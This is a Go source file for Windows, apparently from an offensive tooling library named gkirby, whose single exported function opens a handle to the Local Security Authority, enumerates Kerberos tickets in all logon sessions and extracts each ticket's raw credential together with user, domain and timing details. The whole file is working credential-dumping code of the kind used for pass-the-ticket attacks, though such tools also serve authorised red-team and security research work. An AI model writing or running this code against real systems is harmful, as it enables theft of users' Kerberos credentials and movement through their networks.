//go:build windows
// +build windows

package gkirby

import (
	"time"

	"github.com/ziggoon/gkirby/lsa"
	"github.com/ziggoon/gkirby/types"
)

/*
* public bois
 */

// return a map of kerberos tickets
func GetKerberosTickets() []map[string]interface{} {
	var ticketCache []map[string]interface{}

	lsaHandle, err := lsa.GetLsaHandle()
	if err != nil {
		return nil
	}

	kerberosString := types.NewLSAString("kerberos")
	authPackage, err := lsa.GetAuthenticationPackage(lsaHandle, kerberosString)
	if err != nil {
		return nil
	}

	sessionCreds, err := lsa.EnumerateTickets(lsaHandle, authPackage)
	if err != nil {
		return nil
	}

	ticketCache = make([]map[string]interface{}, 0)
	for _, cred := range sessionCreds {
		for _, ticket := range cred.Tickets {
			extractedTicket, err := lsa.ExtractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
			if err != nil {
				continue
			}

			ticket := map[string]interface{}{
				"username":    cred.LogonSession.Username,
				"domain":      cred.LogonSession.LogonDomain,
				"logonId":     cred.LogonSession.LogonID.LowPart,
				"serverName":  ticket.ServerName,
				"serverRealm": ticket.ServerRealm,
				"startTime":   ticket.StartTime.Format(time.RFC3339),
				"endTime":     ticket.EndTime.Format(time.RFC3339),
				"renewTime":   ticket.RenewTime.Format(time.RFC3339),
				"flags":       ticket.TicketFlags.String(),
				"encType":     ticket.EncryptionType,
				"krbCred":     extractedTicket,
			}

			ticketCache = append(ticketCache, ticket)
		}
	}

	if len(ticketCache) > 0 {
		return ticketCache
	}

	return nil
}
